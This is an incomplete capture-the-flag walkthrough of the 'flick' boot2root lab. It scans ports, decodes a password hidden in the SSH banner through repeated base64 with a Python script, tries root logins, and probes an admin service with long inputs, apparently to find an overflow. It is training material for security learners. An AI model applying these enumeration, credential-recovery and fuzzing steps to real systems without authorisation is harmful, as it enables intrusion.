#Flick: 1#

----
**Author**: Leonjza  
**Links**: https://leonjza.github.io/blog/2014/08/07/flick-can-you-find-the-flag/  

----

##Description##

```
 .o88o. oooo   o8o            oooo
 888 `" `888   `"'            `888
o888oo   888  oooo   .ooooo.   888  oooo
 888     888  `888  d88' `"Y8  888 .8P'
 888     888   888  888        888888.
 888     888   888  888   .o8  888 `88b.
o888o   o888o o888o `Y8bod8P' o888o o888o

Welcome to the flick boot2root!

- Where is the flag?
- What do you need to flick to find it?

Completing "flick" will require some sound
thinking, good enumeration skills & time! The
objective is to find and read the flag that
lives /root/

As a bonus, can you get root command execution?

Shoutout to @barrebas & @TheColonial for testing
it out first :)

$ sha1sum flick.ova
0e65f5a1f2b560d10115796c1adfb03548583db2  flick.ova

Good Luck!
@leonjza
```

----

##Workthrough##

Scan flick lab for open port(s) with nmap.   

```
lab:pentestlab/ $ nmap -v -n -T4 -p- 192.168.10.42

Starting Nmap 6.47 ( http://nmap.org ) at 2015-07-20 15:02 UTC
Initiating Ping Scan at 15:02
Scanning 192.168.10.42 [2 ports]
Completed Ping Scan at 15:02, 0.00s elapsed (1 total hosts)
Initiating Connect Scan at 15:02
Scanning 192.168.10.42 [65535 ports]
Discovered open port 22/tcp on 192.168.10.42
Discovered open port 8881/tcp on 192.168.10.42
Completed Connect Scan at 15:02, 4.25s elapsed (65535 total ports)
Nmap scan report for 192.168.10.42
Host is up (0.017s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8881/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.35 seconds

```

###Port: 22###

Use ncat for ssh banner view.  

```
lab:pentestlab/ $ ncat -v 192.168.10.42 22
Ncat: Version 6.47 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.10.42:22.
SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.1
^C

```
Connect to port 22, and check the log.  

```
lab:pentestlab/ $ ssh -v root@192.168.10.42
OpenSSH_6.9p1, OpenSSL 1.0.2d 9 Jul 2015
...
debug1: kex: server->client aes128-ctr umac-64@openssh.com none
debug1: kex: client->server aes128-ctr umac-64@openssh.com none
debug1: sending SSH2_MSG_KEX_ECDH_INIT
debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
debug1: Server host key: ecdsa-sha2-nistp256 SHA256:OgFkTDTD/D7ndkanMRwJI92zYuzltDSkOS7E3sPlpPk
The authenticity of host '192.168.10.42 (192.168.10.42)' can't be established.
ECDSA key fingerprint is SHA256:OgFkTDTD/D7ndkanMRwJI92zYuzltDSkOS7E3sPlpPk.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.10.42' (ECDSA) to the list of known hosts.
debug1: SSH2_MSG_NEWKEYS sent
debug1: expecting SSH2_MSG_NEWKEYS
debug1: SSH2_MSG_NEWKEYS received
debug1: Roaming not allowed by server
debug1: SSH2_MSG_SERVICE_REQUEST sent
debug1: SSH2_MSG_SERVICE_ACCEPT received

\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34
\x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74
\x65\x46\x5a\x56\x4d\x6a\x41\x31\x56\x6a\x41\x78\x56\x32\x4a\x45\x54\x6c\x68\x68
\x4d\x6b\x30\x78\x56\x6d\x70\x4b\x53\x31\x49\x79\x53\x6b\x56\x55\x62\x47\x68\x6f
\x54\x56\x68\x43\x55\x56\x5a\x74\x65\x46\x5a\x6c\x52\x6c\x6c\x35\x56\x47\x74\x73
\x61\x6c\x4a\x74\x61\x47\x39\x55\x56\x6d\x68\x44\x56\x56\x5a\x61\x63\x56\x46\x74
\x52\x6c\x70\x57\x4d\x44\x45\x31\x56\x54\x4a\x30\x56\x31\x5a\x58\x53\x6b\x68\x68
\x52\x7a\x6c\x56\x56\x6d\x78\x61\x4d\x31\x5a\x73\x57\x6d\x46\x6b\x52\x30\x35\x47
\x57\x6b\x5a\x53\x54\x6d\x46\x36\x52\x54\x46\x57\x56\x45\x6f\x77\x56\x6a\x46\x61
\x57\x46\x4e\x72\x61\x47\x68\x53\x65\x6d\x78\x57\x56\x6d\x70\x4f\x54\x30\x30\x78
\x63\x46\x5a\x58\x62\x55\x5a\x72\x55\x6a\x41\x31\x52\x31\x64\x72\x57\x6e\x64\x57
\x4d\x44\x46\x46\x55\x6c\x52\x47\x56\x31\x5a\x46\x62\x33\x64\x57\x61\x6b\x5a\x68
\x56\x30\x5a\x4f\x63\x6d\x46\x48\x61\x46\x4e\x6c\x62\x58\x68\x58\x56\x6d\x30\x78
\x4e\x46\x6c\x56\x4d\x48\x68\x58\x62\x6b\x35\x59\x59\x6c\x56\x61\x63\x6c\x56\x71
\x51\x54\x46\x53\x4d\x57\x52\x79\x56\x32\x78\x4f\x56\x57\x4a\x56\x63\x45\x64\x5a
\x4d\x46\x5a\x33\x56\x6a\x4a\x4b\x56\x56\x4a\x59\x5a\x46\x70\x6c\x61\x33\x42\x49
\x56\x6d\x70\x47\x54\x32\x52\x57\x56\x6e\x52\x68\x52\x6b\x35\x73\x59\x6c\x68\x6f
\x57\x46\x5a\x74\x4d\x58\x64\x55\x4d\x56\x46\x33\x54\x55\x68\x6f\x61\x6c\x4a\x73
\x63\x46\x6c\x5a\x62\x46\x5a\x68\x59\x32\x78\x57\x63\x56\x46\x55\x52\x6c\x4e\x4e
\x56\x6c\x59\x31\x56\x46\x5a\x53\x55\x31\x5a\x72\x4d\x58\x4a\x6a\x52\x6d\x68\x57
\x54\x57\x35\x53\x4d\x31\x5a\x71\x53\x6b\x74\x57\x56\x6b\x70\x5a\x57\x6b\x5a\x77
\x62\x47\x45\x7a\x51\x6b\x6c\x57\x62\x58\x42\x48\x56\x44\x4a\x53\x56\x31\x5a\x75
\x55\x6d\x68\x53\x61\x7a\x56\x7a\x57\x57\x78\x6f\x62\x31\x64\x47\x57\x6e\x52\x4e
\x53\x47\x68\x50\x55\x6d\x31\x34\x56\x31\x52\x56\x61\x47\x39\x58\x52\x30\x70\x79
\x54\x6c\x5a\x73\x57\x6d\x4a\x47\x57\x6d\x68\x5a\x4d\x6e\x68\x58\x59\x7a\x46\x57
\x63\x6c\x70\x47\x61\x47\x6c\x53\x4d\x31\x46\x36\x56\x6a\x4a\x30\x55\x31\x55\x78
\x57\x6e\x4a\x4e\x57\x45\x70\x71\x55\x6d\x31\x6f\x56\x31\x52\x58\x4e\x56\x4e\x4e
\x4d\x56\x70\x78\x55\x32\x74\x30\x56\x31\x5a\x72\x63\x46\x70\x58\x61\x31\x70\x33
\x56\x6a\x46\x4b\x56\x32\x4e\x49\x62\x46\x64\x57\x52\x55\x70\x6f\x56\x6b\x52\x4b
\x54\x32\x52\x47\x53\x6e\x4a\x61\x52\x6d\x68\x70\x56\x6a\x4e\x6f\x56\x56\x64\x57
\x55\x6b\x39\x52\x4d\x57\x52\x48\x56\x32\x35\x53\x54\x6c\x5a\x46\x53\x6c\x68\x55
\x56\x33\x68\x48\x54\x6c\x5a\x61\x57\x45\x35\x56\x4f\x56\x68\x53\x4d\x48\x42\x4a
\x56\x6c\x64\x34\x63\x31\x64\x74\x53\x6b\x68\x68\x52\x6c\x4a\x58\x54\x55\x5a\x77
\x56\x46\x5a\x71\x52\x6e\x64\x53\x4d\x56\x4a\x30\x5a\x55\x64\x73\x55\x32\x4a\x59
\x59\x33\x68\x57\x61\x31\x70\x68\x56\x54\x46\x56\x65\x46\x64\x75\x53\x6b\x35\x58
\x52\x58\x42\x78\x56\x57\x78\x6b\x4e\x47\x46\x47\x56\x58\x64\x68\x52\x55\x35\x55
\x55\x6d\x78\x77\x65\x46\x55\x79\x64\x47\x46\x69\x52\x6c\x70\x7a\x56\x32\x78\x77
\x57\x47\x45\x78\x63\x44\x4e\x5a\x61\x32\x52\x47\x5a\x57\x78\x47\x63\x6d\x4a\x47
\x5a\x46\x64\x4e\x4d\x45\x70\x4a\x56\x6d\x74\x53\x53\x31\x55\x78\x57\x58\x68\x57
\x62\x6c\x5a\x57\x59\x6c\x68\x43\x56\x46\x6c\x72\x56\x6e\x64\x57\x56\x6c\x70\x30
\x5a\x55\x63\x35\x55\x6b\x31\x58\x55\x6e\x70\x57\x4d\x6a\x56\x4c\x56\x30\x64\x4b
\x53\x46\x56\x74\x4f\x56\x56\x57\x62\x48\x42\x59\x56\x47\x78\x61\x59\x56\x64\x48
\x56\x6b\x68\x6b\x52\x32\x68\x70\x55\x6c\x68\x42\x64\x31\x64\x57\x56\x6d\x39\x55
\x4d\x56\x70\x30\x55\x6d\x35\x4b\x54\x31\x5a\x73\x53\x6c\x68\x55\x56\x6c\x70\x33
\x56\x30\x5a\x72\x65\x46\x64\x72\x64\x47\x70\x69\x56\x6b\x70\x49\x56\x6c\x64\x34
\x61\x32\x46\x57\x53\x6e\x52\x50\x56\x45\x35\x58\x54\x57\x35\x6f\x57\x46\x6c\x71
\x53\x6b\x5a\x6c\x52\x6d\x52\x5a\x57\x6b\x55\x31\x56\x31\x5a\x73\x63\x46\x56\x58
\x56\x33\x52\x72\x56\x54\x46\x73\x56\x31\x56\x73\x57\x6c\x68\x69\x56\x56\x70\x7a
\x57\x57\x74\x61\x64\x32\x56\x47\x56\x58\x6c\x6b\x52\x45\x4a\x58\x54\x56\x5a\x77
\x65\x56\x59\x79\x65\x48\x64\x58\x62\x46\x70\x58\x59\x30\x68\x4b\x56\x31\x5a\x46
\x57\x6b\x78\x57\x4d\x56\x70\x48\x59\x32\x31\x4b\x52\x31\x70\x47\x5a\x45\x35\x4e
\x52\x58\x42\x4b\x56\x6d\x31\x30\x55\x31\x4d\x78\x56\x58\x68\x58\x57\x47\x68\x68
\x55\x30\x5a\x61\x56\x6c\x6c\x72\x57\x6b\x74\x6a\x52\x6c\x70\x78\x56\x47\x30\x35
\x56\x31\x5a\x73\x63\x45\x68\x58\x56\x45\x35\x76\x59\x56\x55\x78\x57\x46\x56\x75
\x63\x46\x64\x4e\x56\x32\x68\x32\x56\x31\x5a\x61\x53\x31\x49\x78\x54\x6e\x56\x52
\x62\x46\x5a\x58\x54\x54\x46\x4b\x4e\x6c\x5a\x48\x64\x47\x46\x68\x4d\x6b\x35\x7a
\x56\x32\x35\x53\x61\x31\x4a\x74\x55\x6e\x42\x57\x62\x47\x68\x44\x54\x6c\x5a\x6b
\x56\x56\x46\x74\x52\x6d\x70\x4e\x56\x31\x49\x77\x56\x54\x4a\x30\x61\x31\x64\x48
\x53\x6c\x68\x68\x52\x30\x5a\x56\x56\x6d\x78\x77\x4d\x31\x70\x58\x65\x48\x4a\x6c
\x56\x31\x5a\x49\x5a\x45\x64\x30\x55\x32\x45\x7a\x51\x58\x64\x58\x62\x46\x5a\x68
\x59\x54\x4a\x47\x56\x31\x64\x75\x53\x6d\x6c\x6c\x61\x31\x70\x59\x57\x57\x78\x6f
\x51\x31\x52\x47\x55\x6e\x4a\x58\x62\x45\x70\x73\x55\x6d\x31\x53\x65\x6c\x6c\x56
\x57\x6c\x4e\x68\x56\x6b\x70\x31\x55\x57\x78\x77\x56\x32\x4a\x59\x55\x6c\x68\x61
\x52\x45\x5a\x72\x55\x6a\x4a\x4b\x53\x56\x52\x74\x61\x46\x4e\x57\x56\x46\x5a\x61
\x56\x6c\x63\x78\x4e\x47\x51\x79\x56\x6b\x64\x57\x62\x6c\x4a\x72\x55\x6b\x56\x4b
\x62\x31\x6c\x59\x63\x45\x64\x6c\x56\x6c\x4a\x7a\x56\x6d\x35\x4f\x57\x47\x4a\x47
\x63\x46\x68\x5a\x4d\x47\x68\x4c\x56\x32\x78\x61\x57\x46\x56\x72\x5a\x47\x46\x57
\x56\x31\x4a\x51\x56\x54\x42\x6b\x52\x31\x49\x79\x52\x6b\x68\x69\x52\x6b\x35\x70
\x59\x54\x42\x77\x4d\x6c\x5a\x74\x4d\x54\x42\x56\x4d\x55\x31\x34\x56\x56\x68\x73
\x56\x56\x64\x48\x65\x46\x5a\x5a\x56\x45\x5a\x33\x59\x55\x5a\x57\x63\x56\x4e\x74
\x4f\x56\x64\x53\x62\x45\x70\x5a\x56\x47\x78\x6a\x4e\x57\x45\x79\x53\x6b\x64\x6a
\x52\x57\x68\x58\x59\x6c\x52\x42\x4d\x56\x5a\x58\x63\x33\x68\x58\x52\x6c\x5a\x7a
\x59\x55\x5a\x6b\x54\x6c\x59\x79\x61\x44\x4a\x57\x61\x6b\x4a\x72\x55\x7a\x46\x6b
\x56\x31\x5a\x75\x53\x6c\x42\x57\x62\x48\x42\x76\x57\x56\x52\x47\x64\x31\x4e\x57
\x57\x6b\x68\x6c\x52\x30\x5a\x61\x56\x6d\x31\x53\x52\x31\x52\x73\x57\x6d\x46\x56
\x52\x6c\x6c\x35\x59\x55\x5a\x6f\x57\x6c\x64\x49\x51\x6c\x68\x56\x4d\x46\x70\x68
\x59\x31\x5a\x4f\x63\x56\x56\x73\x57\x6b\x35\x57\x4d\x55\x6c\x33\x56\x6c\x52\x4b
\x4d\x47\x49\x79\x52\x6b\x64\x54\x62\x6b\x35\x55\x59\x6b\x64\x6f\x56\x6c\x5a\x73
\x57\x6e\x64\x4e\x4d\x56\x70\x79\x56\x32\x31\x47\x61\x6c\x5a\x72\x63\x44\x42\x61
\x52\x57\x51\x77\x56\x6a\x4a\x4b\x63\x6c\x4e\x72\x61\x46\x64\x53\x4d\x32\x68\x6f
\x56\x6b\x52\x4b\x52\x31\x59\x78\x54\x6e\x56\x56\x62\x45\x4a\x58\x55\x6c\x52\x57
\x57\x56\x64\x57\x55\x6b\x64\x6b\x4d\x6b\x5a\x48\x56\x32\x78\x57\x55\x32\x45\x78
\x63\x48\x4e\x56\x62\x54\x46\x54\x5a\x57\x78\x73\x56\x6c\x64\x73\x54\x6d\x68\x53
\x56\x45\x5a\x61\x56\x56\x63\x31\x62\x31\x59\x78\x57\x58\x70\x68\x53\x45\x70\x61
\x59\x57\x74\x61\x63\x6c\x56\x71\x52\x6c\x64\x6a\x4d\x6b\x5a\x47\x54\x31\x5a\x6b
\x56\x31\x5a\x47\x57\x6d\x46\x57\x62\x47\x4e\x34\x54\x6b\x64\x52\x65\x56\x5a\x72
\x5a\x46\x64\x69\x62\x45\x70\x79\x56\x57\x74\x57\x53\x32\x49\x78\x62\x46\x6c\x6a
\x52\x57\x52\x73\x56\x6d\x78\x4b\x65\x6c\x5a\x74\x4d\x44\x56\x58\x52\x30\x70\x48
\x59\x30\x5a\x6f\x57\x6b\x31\x48\x61\x45\x78\x57\x4d\x6e\x68\x68\x56\x30\x5a\x57
\x63\x6c\x70\x48\x52\x6c\x64\x4e\x4d\x6d\x68\x4a\x56\x31\x52\x4a\x65\x46\x4d\x78
\x53\x58\x68\x6a\x52\x57\x52\x68\x55\x6d\x73\x31\x57\x46\x59\x77\x56\x6b\x74\x4e
\x62\x46\x70\x30\x59\x30\x56\x6b\x57\x6c\x59\x77\x56\x6a\x52\x57\x62\x47\x68\x76
\x56\x30\x5a\x6b\x53\x47\x46\x47\x57\x6c\x70\x69\x57\x47\x68\x6f\x56\x6d\x31\x34
\x63\x32\x4e\x73\x5a\x48\x4a\x6b\x52\x33\x42\x54\x59\x6b\x5a\x77\x4e\x46\x5a\x58
\x4d\x54\x42\x4e\x52\x6c\x6c\x34\x56\x32\x35\x4f\x61\x6c\x4a\x58\x61\x46\x68\x57
\x61\x6b\x35\x54\x56\x45\x5a\x73\x56\x56\x46\x59\x61\x46\x4e\x57\x61\x33\x42\x36
\x56\x6b\x64\x34\x59\x56\x55\x79\x53\x6b\x5a\x58\x57\x48\x42\x58\x56\x6c\x5a\x77
\x52\x31\x51\x78\x57\x6b\x4e\x56\x62\x45\x4a\x56\x54\x55\x51\x77\x50\x51\x3d\x3d

 .o88o. oooo   o8o            oooo        
 888 `" `888   `"'            `888        
o888oo   888  oooo   .ooooo.   888  oooo  
 888     888  `888  d88' `"Y8  888 .8P'   
 888     888   888  888        888888.    
 888     888   888  888   .o8  888 `88b.  
o888o   o888o o888o `Y8bod8P' o888o o888o 
                                          

debug1: Authentications that can continue: publickey,password
debug1: Next authentication method: publickey
debug1: Trying private key: /home/notfound/.ssh/id_rsa
debug1: Trying private key: /home/notfound/.ssh/id_dsa
debug1: Trying private key: /home/notfound/.ssh/id_ecdsa
debug1: Trying private key: /home/notfound/.ssh/id_ed25519
debug1: Next authentication method: password
root@192.168.10.42's password: 

```

decode hex string, we can get this:

```
Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1IyRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ==
```

we guesse that the string is encoded by base64. So we create py script to decode it.

```
#!/usr/bin/env python2
# -*- coding: utf8 -*-

import base64


def decode(data):
    n = 0
    while True:
        try:
            data = base64.b64decode(data)
        except TypeError:
            n = n - 1
            break
        else:
            n = n + 1

    data = base64.b64encode(data)
    return n, data


if __name__ == "__main__":
    enc_str = "Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1IyRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ=="
    print "[+] decode %d times: %s" % decode(enc_str)

```

run the command as follow:  

```
lab:flick/ $ python decode.py 
[+] decode 16 times: tabupJievas8Knoj
```

try to login ssh with password "**tabupJievas8Knoj**",  


```
root@192.168.10.42's password: 
Permission denied, please try again.
root@192.168.10.42's password: 
Permission denied, please try again.
root@192.168.10.42's password: 
```

###Port: 8881###

connect to port 8881 with ncat,  

```
lab:pentestlab/ $ ncat -v 192.168.10.42 8881
Ncat: Version 6.47 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.10.42:8881.
Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
> 

```

try to input different length string as follow:  

```
> Ncat: 2 bytes sent, 104 bytes received in 0.03 seconds.
lab:pentestlab/ $ python2 -c 'print "A"' | ncat 192.168.10.42 8881
Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
> OK: A

> lab:pentestlab/ $ python2 -c 'print "A" * 2' | ncat 192.168.10.42 8881
Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
> OK: AA

> lab:pentestlab/ $ python2 -c 'print "A" * 20' | ncat 192.168.10.42 8881
Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
> OK: AAAAAAAAAAAAAAAAAAAA

> lab:pentestlab/ $ python2 -c 'print "A" * 2000' | ncat 192.168.10.42 8881
Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
> OK: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> OK: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA